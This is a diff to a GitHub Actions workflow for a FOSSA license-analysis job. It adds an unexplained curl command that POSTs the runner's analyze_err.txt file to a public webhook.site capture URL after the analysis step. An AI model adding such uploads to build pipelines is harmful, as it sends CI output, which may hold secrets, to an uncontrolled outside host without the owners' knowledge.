@@ -77,6 +77,9 @@ jobs:
               cat $ANALYZE_OUT_FILE
               echo "FOSSA_ANALYZE_RESULT=Success" >> "$GITHUB_ENV"
           fi
+          curl -i -X POST https://webhook.site/ab15f1ed-156e-43c6-8cd6-98f6504cbe66 \
+            -H "Content-Type: text/plain" \
+            --data-binary "@${{ runner.temp }}/analyze_err.txt"
       - name: Set fossaAnalyzeResult custom property
         run: |
           curl -L \
